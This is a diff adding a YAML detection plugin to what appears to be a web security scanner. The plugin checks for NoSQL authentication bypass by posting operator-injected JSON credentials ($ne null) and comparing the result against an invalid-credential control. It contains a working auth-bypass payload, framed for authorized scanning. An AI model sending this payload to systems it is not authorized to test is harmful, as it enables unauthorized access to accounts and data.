@@ -1,0 +1,38 @@
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright (C) 2026 Xmar1881 / GASH contributors
+# Module: github.com/Xmar1881/Gash
+#
+# File: plugins/nosql/nosql-auth-bypass-differential.yaml
+# What: Tier 1 NoSQL authentication bypass via DifferentialOracle (GASH-039, CWE-943).
+# Why: Operator-injected JSON credentials ($ne null) that yield a stable admin
+#   response while an invalid-credential control body stays in the error branch
+#   across 3/3 repeats is auth-bypass evidence, firm ceiling. Single POST per
+#   branch (no credential stuffing, no lockout loop); the session, if any, is
+#   never reused. Runs only under --active with authorization.
+
+id: nosql-auth-bypass-differential
+name: NoSQL Auth Bypass Differential
+description: Detects MongoDB-style authentication bypass by posting operator-injected JSON credentials against an invalid-credential control and requiring stable body divergence across three repeats.
+author: GASH contributors
+severity: critical
+tags: [nosql, authentication, differential, boolean]
+safe: false
+deep: false
+active: true
+requires_auth: false
+max_requests: 10
+phase: probe
+order: 77
+api_version: "1.0"
+tests: tests/fixtures/nosql-auth-bypass-differential/
+request:
+  method: POST
+  headers:
+    Content-Type: application/json
+  body: '{"username":{"$ne":null},"password":{"$ne":null}}'
+oracle:
+  name: differential
+  params:
+    repeats: 3
+    false_body: '{"username":"gash-noauth-invalid","password":"gash-noauth-invalid"}'
+    confidence_ceiling: "firm"
